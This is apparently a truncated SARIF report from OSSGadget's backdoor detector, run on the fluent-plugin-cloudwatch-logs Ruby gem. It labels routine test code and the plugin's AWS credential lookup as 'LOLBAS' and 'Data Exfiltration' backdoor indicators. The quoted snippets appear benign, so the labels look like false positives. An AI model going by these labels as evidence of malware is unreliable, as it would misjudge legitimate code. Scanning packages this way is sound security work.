{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_in_cloudwatch_log"
                },
                "region": {
                  "startLine": 901,
                  "startColumn": 12,
                  "endLine": 902,
                  "snippet": {
                    "text": "    #{endpoint}\n    format csv\n    keys time,message\n    time_key time\n  EOC\n  end\n\n  def csv_format_config_aws_timestamp\n",
                    "rendered": {
                      "text": "    #{endpoint}\n    format csv\n    keys time,message\n    time_key time\n  EOC\n  end\n\n  def csv_format_config_aws_timestamp\n",
                      "markdown": "`    #{endpoint}\n    format csv\n    keys time,message\n    time_key time\n  EOC\n  end\n\n  def csv_format_config_aws_timestamp\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_in_cloudwatch_log"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 17,
                  "endLine": 50,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      assert_equal(30, d.instance.throttling_retry_seconds)\n    end\n\n    test 'invalid time range' do\n      assert_raise(Fluent::ConfigError) do\n        create_driver(<<-EOC)\n          @type cloudwatch_logs\n",
                    "rendered": {
                      "text": "      assert_equal(30, d.instance.throttling_retry_seconds)\n    end\n\n    test 'invalid time range' do\n      assert_raise(Fluent::ConfigError) do\n        create_driver(<<-EOC)\n          @type cloudwatch_logs\n",
                      "markdown": "`      assert_equal(30, d.instance.throttling_retry_seconds)\n    end\n\n    test 'invalid time range' do\n      assert_raise(Fluent::ConfigError) do\n        create_driver(<<-EOC)\n          @type cloudwatch_logs\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_in_cloudwatch_log"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 30,
                  "endLine": 215,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        d = create_driver(csv_format_config)\n        d.run(expect_emits: 2, timeout: 5)\n        next_token = d.instance.instance_variable_get(:@next_token_storage)\n        assert_true next_token.get(d.instance.state_key_for(log_stream_name, log_group_name)).is_a?(String)\n\n        emits = d.events\n        assert_equal(2, emits.size)\n",
                    "rendered": {
                      "text": "        d = create_driver(csv_format_config)\n        d.run(expect_emits: 2, timeout: 5)\n        next_token = d.instance.instance_variable_get(:@next_token_storage)\n        assert_true next_token.get(d.instance.state_key_for(log_stream_name, log_group_name)).is_a?(String)\n\n        emits = d.events\n        assert_equal(2, emits.size)\n",
                      "markdown": "`        d = create_driver(csv_format_config)\n        d.run(expect_emits: 2, timeout: 5)\n        next_token = d.instance.instance_variable_get(:@next_token_storage)\n        assert_true next_token.get(d.instance.state_key_for(log_stream_name, log_group_name)).is_a?(String)\n\n        emits = d.events\n        assert_equal(2, emits.size)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/out_cloudwatch_l"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 54,
                  "endLine": 157,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        end\n        options[:credentials] = Aws::AssumeRoleWebIdentityCredentials.new(credentials_options)\n      elsif @aws_ecs_authentication\n        # collect AWS credential from ECS relative uri ENV variable\n        aws_container_credentials_relative_uri = ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]\n        options[:credentials] = Aws::ECSCredentials.new({credential_path: aws_container_credentials_relative_uri}).credentials\n      else\n",
                    "rendered": {
                      "text": "        end\n        options[:credentials] = Aws::AssumeRoleWebIdentityCredentials.new(credentials_options)\n      elsif @aws_ecs_authentication\n        # collect AWS credential from ECS relative uri ENV variable\n        aws_container_credentials_relative_uri = ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]\n        options[:credentials] = Aws::ECSCredentials.new({credential_path: aws_container_credentials_relative_uri}).credentials\n      else\n",
                      "markdown": "`        end\n        options[:credentials] = Aws::AssumeRoleWebIdentityCredentials.new(credentials_options)\n      elsif @aws_ecs_authentication\n        # collect AWS credential from ECS relative uri ENV variable\n        aws_container_credentials_relative_uri = ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]\n        options[:credentials] = Aws::ECSCredentials.new({credential_path: aws_container_credentials_relative_uri}).credentials\n      else\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 994,
                  "startColumn": 5,
                  "endLine": 994,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => ''})\n        d.feed(time + 1, {'cloudwatch' => '', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => ''})\n        d.feed(time + 1, {'cloudwatch' => '', 'message' => 'message2'})\n",
                      "markdown": "`        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => ''})\n        d.feed(time + 1, {'cloudwatch' => '', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 969,
                  "startColumn": 5,
                  "endLine": 969,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    end\n\n    def test_too_large_event\n      time = Fluent::Engine.now\n      d = create_driver(<<-EOC)\n        #{default_config}\n        log_group_name #{log_group_name}\n",
                    "rendered": {
                      "text": "    end\n\n    def test_too_large_event\n      time = Fluent::Engine.now\n      d = create_driver(<<-EOC)\n        #{default_config}\n        log_group_name #{log_group_name}\n",
                      "markdown": "`    end\n\n    def test_too_large_event\n      time = Fluent::Engine.now\n      d = create_driver(<<-EOC)\n        #{default_config}\n        log_group_name #{log_group_name}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 949,
                  "startColumn": 5,
                  "endLine": 949,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      mock(client).put_log_events(anything).times(any_times) {\n        raise(Aws::CloudWatchLogs::Errors::ThrottlingException.new(nil, \"error\"))\n      }\n      time = Fluent::Engine.now\n      d = create_driver(<<-EOC)\n        #{default_config}\n        log_group_name #{log_group_name}\n",
                    "rendered": {
                      "text": "      mock(client).put_log_events(anything).times(any_times) {\n        raise(Aws::CloudWatchLogs::Errors::ThrottlingException.new(nil, \"error\"))\n      }\n      time = Fluent::Engine.now\n      d = create_driver(<<-EOC)\n        #{default_config}\n        log_group_name #{log_group_name}\n",
                      "markdown": "`      mock(client).put_log_events(anything).times(any_times) {\n        raise(Aws::CloudWatchLogs::Errors::ThrottlingException.new(nil, \"error\"))\n      }\n      time = Fluent::Engine.now\n      d = create_driver(<<-EOC)\n        #{default_config}\n        log_group_name #{log_group_name}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 5,
                  "endLine": 932,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      stub(client).put_log_events(anything) { resp }.once.ordered\n\n      d = create_driver\n      time = event_time\n      d.instance.instance_variable_set(:@logs, client)\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'message' => 'message1'})\n",
                    "rendered": {
                      "text": "      stub(client).put_log_events(anything) { resp }.once.ordered\n\n      d = create_driver\n      time = event_time\n      d.instance.instance_variable_set(:@logs, client)\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'message' => 'message1'})\n",
                      "markdown": "`      stub(client).put_log_events(anything) { resp }.once.ordered\n\n      d = create_driver\n      time = event_time\n      d.instance.instance_variable_set(:@logs, client)\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'message' => 'message1'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 908,
                  "startColumn": 5,
                  "endLine": 908,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        @log_level debug\n        put_log_events_retry_limit 0\n      EOC\n      time = event_time\n      d.instance.instance_variable_set(:@logs, client)\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'message' => 'message1'})\n",
                    "rendered": {
                      "text": "        @log_level debug\n        put_log_events_retry_limit 0\n      EOC\n      time = event_time\n      d.instance.instance_variable_set(:@logs, client)\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'message' => 'message1'})\n",
                      "markdown": "`        @log_level debug\n        put_log_events_retry_limit 0\n      EOC\n      time = event_time\n      d.instance.instance_variable_set(:@logs, client)\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'message' => 'message1'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 872,
                  "startColumn": 5,
                  "endLine": 872,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs2', 'message' => 'message2', 'group_name_key' => log_group_name, 'stream_name_key' => stream}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs2', 'message' => 'message2', 'group_name_key' => log_group_name, 'stream_name_key' => stream}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs2', 'message' => 'message2', 'group_name_key' => log_group_name, 'stream_name_key' => stream}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 835,
                  "startColumn": 5,
                  "endLine": 835,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'aws_tags' => {\"tag3\" => \"value3\", \"tag4\" => \"value4\"}}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'aws_tags' => {\"tag3\" => \"value3\", \"tag4\" => \"value4\"}}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'aws_tags' => {\"tag3\" => \"value3\", \"tag4\" => \"value4\"}}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 804,
                  "startColumn": 5,
                  "endLine": 804,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs2', 'message' => 'message2', 'log_group_tags' => {\"tag1\" => \"value1\", \"tag2\" => \"value2\"}},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs2', 'message' => 'message2', 'log_group_tags' => {\"tag1\" => \"value1\", \"tag2\" => \"value2\"}},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs2', 'message' => 'message2', 'log_group_tags' => {\"tag1\" => \"value1\", \"tag2\" => \"value2\"}},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 776,
                  "startColumn": 5,
                  "endLine": 776,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'aws_tags' => {\"tag1\" => \"value1\", \"tag2\" => \"value2\"}}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'aws_tags' => {\"tag1\" => \"value1\", \"tag2\" => \"value2\"}}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'aws_tags' => {\"tag1\" => \"value1\", \"tag2\" => \"value2\"}}\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 744,
                  "startColumn": 5,
                  "endLine": 744,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs2', 'message' => 'message2', 'retention_in_days' => '7'},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs2', 'message' => 'message2', 'retention_in_days' => '7'},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs2', 'message' => 'message2', 'retention_in_days' => '7'},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 718,
                  "startColumn": 5,
                  "endLine": 718,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 690,
                  "startColumn": 5,
                  "endLine": 690,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 661,
                  "startColumn": 5,
                  "endLine": 661,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, \"namespace_name\" => \"fluentd\"},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, \"namespace_name\" => \"fluentd\"},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, \"namespace_name\" => \"fluentd\"},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 620,
                  "startColumn": 5,
                  "endLine": 620,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name},\n      ]\n\n      time = Time.now\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time.to_i + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
